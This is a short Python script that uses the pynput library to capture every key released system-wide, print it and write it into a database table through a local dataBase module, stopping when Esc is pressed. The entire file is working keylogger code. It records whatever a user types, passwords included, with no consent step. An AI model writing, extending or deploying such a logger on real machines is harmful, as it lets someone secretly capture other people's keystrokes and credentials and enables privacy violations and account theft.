from pynput import keyboard
import dataBase

def on_release(key):
    print('{0}'.format(key))

    x = format(key)

    dataBase.cursor.execute("INSERT INTO Users(PutIn) VALUES (?)", (x,))
    dataBase.conn.commit()
    
    # Stop listener
    if key == keyboard.Key.esc:
        return False

# Collect events until released
with keyboard.Listener(
        on_release=on_release) as listener:
    listener.join()